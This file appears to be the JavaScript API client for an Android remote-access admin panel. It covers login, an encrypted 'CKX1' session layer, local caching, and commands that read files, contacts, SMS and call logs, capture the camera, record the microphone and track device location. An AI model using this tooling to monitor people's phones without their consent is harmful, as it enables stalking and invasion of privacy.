import { ApiError } from './errors.js';
import { attachDevicesApi } from './devices.js';
import { attachFilesApi } from './files.js';
import { attachContactsApi } from './contacts.js';
import { attachRecordsApi } from './records.js';
import { attachCameraApi } from './camera.js';
import { attachMicApi } from './mic.js';
import { attachLocationApi } from './location.js';
import { attachCommsApi } from './comms.js';
import { attachArtifactsApi } from './artifacts.js';
import { attachMediaApi } from './media.js';
import { attachMirrorsApi } from './mirrors.js';
import { attachTransfersApi } from './transfers.js';
import { attachAuditApi } from './audit.js';
import { establishAdminCkx1 } from '../crypto/ckx1.js';

// In dev, use Vite proxy (/api → backend). Override with VITE_API_URL for direct or HTTPS.
const API_BASE_URL =
    import.meta.env.VITE_API_URL ||
    (import.meta.env.DEV ? '/api/v1' : 'http://localhost:8443/api/v1');

const DB_NAME = 'android_remote_access';
const DB_VERSION = 1;
let db = null;

/** Spec-style command names → server/agent command types */
const COMMAND_ALIASES = {
    'storage.roots': 'file_list',
    'file.list': 'file_list',
    'file.read': 'file_read',
    'file.read.chunk': 'file_read_chunk',
    'file.stat': 'file_list',
    'contacts.list': 'get_contacts',
    'contacts.search': 'get_contacts',
    'sms.inbox': 'get_sms_messages',
    'sms.sent': 'get_sms_messages',
    'sms.conversations': 'get_sms_messages',
    'sms.messages': 'get_sms_messages',
    'sms.search': 'get_sms_messages',
    'calllogs.list': 'get_call_logs',
    'calllogs.sync': 'get_call_logs',
    'camera.capture': 'camera_snapshot',
    'audio.record.start': 'mic_start',
    'audio.record.stop': 'mic_stop',
    'location.get': 'get_location',
    'location.track': 'get_location',
    'location.stop': 'get_location',
};

const CKX1_SKIP_ENCRYPT = new Set([
    '/auth/login',
    '/auth/refresh',
    '/auth/logout',
    '/auth/ckx1/offer',
    '/auth/ckx1/exchange',
]);

class ApiClient {
    constructor() {
        this.accessToken = localStorage.getItem('access_token');
        this.refreshToken = localStorage.getItem('refresh_token');
        /** @type {import('../crypto/ckx1.js').AdminCkx1Session | null} */
        this.ckx1 = null;
        this._ckx1Promise = null;
        /** Serializes CKX1 seal so outbound sequence numbers stay monotonic. */
        this._ckx1SendChain = Promise.resolve();
        /** Serializes CKX1 open so concurrent decrypts don't race the receive window. */
        this._ckx1RecvChain = Promise.resolve();
        this.initDB();
    }

    async initDB() {
        if (db) return db;
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(DB_NAME, DB_VERSION);
            request.onerror = () => reject(request.error);
            request.onsuccess = () => {
                db = request.result;
                resolve(db);
            };
            request.onupgradeneeded = (event) => {
                const database = event.target.result;
                const stores = [
                    'file_trees', 'contacts', 'sms_inbox', 'sms_sent', 'transfers',
                    'location_history', 'camera_captures', 'audio_recordings', 'preferences',
                ];
                stores.forEach((name) => {
                    if (!database.objectStoreNames.contains(name)) {
                        if (name === 'transfers') {
                            const s = database.createObjectStore(name, { keyPath: 'id', autoIncrement: true });
                            s.createIndex('device_path', ['device_id', 'remote_path'], { unique: false });
                        } else if (['location_history', 'camera_captures', 'audio_recordings'].includes(name)) {
                            database.createObjectStore(name, { keyPath: 'id', autoIncrement: true });
                        } else if (name === 'preferences') {
                            database.createObjectStore(name, { keyPath: 'key' });
                        } else {
                            database.createObjectStore(name, { keyPath: 'device_id' });
                        }
                    }
                });
            };
        });
    }

    async dbGet(storeName, key) {
        await this.initDB();
        return new Promise((resolve, reject) => {
            const tx = db.transaction(storeName, 'readonly');
            const request = tx.objectStore(storeName).get(key);
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(request.error);
        });
    }

    async dbPut(storeName, data) {
        await this.initDB();
        return new Promise((resolve, reject) => {
            const tx = db.transaction(storeName, 'readwrite');
            const request = tx.objectStore(storeName).put(data);
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(request.error);
        });
    }

    async dbGetAll(storeName) {
        await this.initDB();
        return new Promise((resolve, reject) => {
            const tx = db.transaction(storeName, 'readonly');
            const request = tx.objectStore(storeName).getAll();
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(request.error);
        });
    }

    getCkx1SessionToken() {
        return this.ckx1?.protocolSessionId || null;
    }

    async ensureCkx1(adminId) {
        if (this.ckx1?.ready()) return this.ckx1;
        if (this._ckx1Promise) return this._ckx1Promise;
        const id = adminId || JSON.parse(localStorage.getItem('user') || '{}')?.id;
        if (!id || !this.accessToken) {
            throw new ApiError('Cannot establish CKX1 without admin session', 401, 'CKX1_NO_ADMIN');
        }
        this._ckx1Promise = (async () => {
            const postJson = async (path, init = {}) => {
                const headers = {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${this.accessToken}`,
                    ...(init.headers || {}),
                };
                const res = await fetch(`${API_BASE_URL}${path}`, { ...init, headers });
                if (!res.ok) {
                    const error = await res.json().catch(() => ({}));
                    throw new ApiError(error.error || error.message || 'CKX1 handshake failed', res.status, error.code);
                }
                return res.json();
            };
            this.ckx1 = await establishAdminCkx1(id, postJson);
            return this.ckx1;
        })().finally(() => {
            this._ckx1Promise = null;
        });
        return this._ckx1Promise;
    }

    clearCkx1() {
        this.ckx1 = null;
        this._ckx1Promise = null;
    }

    async request(endpoint, options = {}) {
        const skipEncrypt = CKX1_SKIP_ENCRYPT.has(endpoint) || options.skipCkx1 === true;
        const useCkx1 = !skipEncrypt && !!this.accessToken;
        if (!useCkx1) {
            return this._request(endpoint, options);
        }
        // Concurrent sealed POSTs can arrive out of order; the server rejects older seq as replay.
        const run = this._ckx1SendChain.then(() => this._request(endpoint, options));
        this._ckx1SendChain = run.then(() => undefined, () => undefined);
        return run;
    }

    async _request(endpoint, options = {}) {
        const url = `${API_BASE_URL}${endpoint}`;
        const skipEncrypt = CKX1_SKIP_ENCRYPT.has(endpoint) || options.skipCkx1 === true;
        const headers = {
            'Content-Type': 'application/json',
            ...options.headers,
        };

        if (this.accessToken) {
            headers.Authorization = `Bearer ${this.accessToken}`;
        }

        if (!skipEncrypt && this.accessToken) {
            await this.ensureCkx1();
            headers['X-CKX1-Session'] = this.ckx1.protocolSessionId;
        }

        let body = options.body;
        if (!skipEncrypt && body && typeof body === 'string' && this.ckx1?.ready()) {
            const plain = new TextEncoder().encode(body);
            body = JSON.stringify(this.ckx1.seal(plain));
        }

        try {
            const controller = new AbortController();
            const timeoutMs = options.timeoutMs ?? 30000;
            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

            let response;
            try {
                response = await fetch(url, {
                    ...options,
                    headers,
                    body,
                    signal: controller.signal,
                });
            } finally {
                clearTimeout(timeoutId);
            }

            if (response.status === 401 && this.refreshToken && !endpoint.includes('/auth/')) {
                await this.refreshAccessToken();
                this.clearCkx1();
                await this.ensureCkx1();
                headers.Authorization = `Bearer ${this.accessToken}`;
                headers['X-CKX1-Session'] = this.ckx1.protocolSessionId;
                let retryBody = options.body;
                if (!skipEncrypt && retryBody && typeof retryBody === 'string') {
                    retryBody = JSON.stringify(this.ckx1.seal(new TextEncoder().encode(retryBody)));
                }
                response = await fetch(url, { ...options, headers, body: retryBody });
            }

            if (!response.ok) {
                const error = await this._parseJsonResponse(response);
                throw new ApiError(error.error || error.message || 'Request failed', response.status, error.code);
            }

            if (options.responseType === 'blob') {
                return response.blob();
            }

            return this._parseJsonResponse(response);
        } catch (error) {
            if (error instanceof TypeError) {
                throw new ApiError('Network error. Please check your connection.', 0, 'NETWORK_ERROR');
            }
            if (error?.name === 'AbortError') {
                throw new ApiError(
                    'Request timed out. Is the Go server running on port 8443?',
                    0,
                    'TIMEOUT',
                );
            }
            throw error;
        }
    }

    async _parseJsonResponse(response) {
        const data = await response.json().catch(() => ({}));
        if (response.headers.get('X-CKX1-Encrypted') === '1' || data?.type === 'enc') {
            if (!this.ckx1?.ready()) {
                throw new ApiError('Encrypted response but no CKX1 session', 500, 'CKX1_MISSING');
            }
            try {
                const run = this._ckx1RecvChain.then(() => {
                    const plain = this.ckx1.open(data);
                    return JSON.parse(new TextDecoder().decode(plain));
                });
                this._ckx1RecvChain = run.then(() => undefined, () => undefined);
                return await run;
            } catch (err) {
                const msg = err?.message || String(err);
                throw new ApiError(`CKX1 decrypt failed: ${msg}`, 400, 'CKX1_DECRYPT');
            }
        }
        return data;
    }

    async refreshAccessToken() {
        const response = await fetch(`${API_BASE_URL}/auth/refresh`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refresh_token: this.refreshToken }),
        });

        if (!response.ok) {
            this.logout();
            throw new ApiError('Session expired', 401, 'SESSION_EXPIRED');
        }

        const data = await response.json();
        this.accessToken = data.access_token;
        this.refreshToken = data.refresh_token;
        localStorage.setItem('access_token', this.accessToken);
        localStorage.setItem('refresh_token', this.refreshToken);
    }

    setTokens(accessToken, refreshToken) {
        this.accessToken = accessToken;
        this.refreshToken = refreshToken;
        localStorage.setItem('access_token', accessToken);
        localStorage.setItem('refresh_token', refreshToken);
    }

    clearTokens() {
        this.accessToken = null;
        this.refreshToken = null;
        localStorage.removeItem('access_token');
        localStorage.removeItem('refresh_token');
        this.clearCkx1();
    }

    isAuthenticated() {
        return !!this.accessToken;
    }

    async login(username, password) {
        const data = await this.request('/auth/login', {
            method: 'POST',
            body: JSON.stringify({ username, password }),
            skipCkx1: true,
        });
        this.setTokens(data.access_token, data.refresh_token);
        if (data.admin?.id) {
            localStorage.setItem('user', JSON.stringify({
                id: data.admin.id,
                username: data.admin.username,
                email: data.admin.email,
                role: data.admin.role,
                permissions: data.admin.permissions,
            }));
            await this.ensureCkx1(data.admin.id);
        }
        return data;
    }

    async logout() {
        try {
            await this.request('/auth/logout', { method: 'POST', skipCkx1: true });
        } catch {
            // Ignore logout errors
        }
        this.clearTokens();
        localStorage.removeItem('user');
    }

    async executeCommand(deviceId, commandType, payload = {}, timeoutSeconds = 60) {
        const command_type = COMMAND_ALIASES[commandType] || commandType;
        const timeoutMs = Math.max(45000, (timeoutSeconds + 20) * 1000);
        return this.request('/commands', {
            method: 'POST',
            body: JSON.stringify({
                device_id: deviceId,
                command_type,
                payload: typeof payload === 'string' ? payload : JSON.stringify(payload),
                timeout_seconds: timeoutSeconds,
            }),
            timeoutMs,
        });
    }

    async getCommandStatus(transactionId) {
        return this.request(`/commands/${transactionId}`);
    }

    async pollCommandResult(transactionId, maxAttempts = 60, interval = 1000) {
        for (let i = 0; i < maxAttempts; i++) {
            const status = await this.getCommandStatus(transactionId);
            if (['success', 'failed', 'timeout', 'cancelled'].includes(status.status)) {
                return status;
            }
            await new Promise((r) => setTimeout(r, interval));
        }
        throw new ApiError('Command polling timeout', 0, 'TIMEOUT');
    }
}

attachDevicesApi(ApiClient.prototype);
attachFilesApi(ApiClient.prototype, { API_BASE_URL });
attachContactsApi(ApiClient.prototype);
attachRecordsApi(ApiClient.prototype);
attachCameraApi(ApiClient.prototype);
attachMicApi(ApiClient.prototype);
attachLocationApi(ApiClient.prototype);
attachCommsApi(ApiClient.prototype);
attachArtifactsApi(ApiClient.prototype);
attachMediaApi(ApiClient.prototype);
attachMirrorsApi(ApiClient.prototype);
attachTransfersApi(ApiClient.prototype);
attachAuditApi(ApiClient.prototype);

export function getAdminWebSocketUrl() {
    const token = localStorage.getItem('access_token');
    if (!token) {
        return null;
    }
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ckx1 = api.getCkx1SessionToken();
    const qs = new URLSearchParams({ token });
    if (ckx1) qs.set('ckx1', ckx1);
    return `${protocol}//${window.location.host}/ws/admin?${qs.toString()}`;
}

export const api = new ApiClient();
export { ApiError };
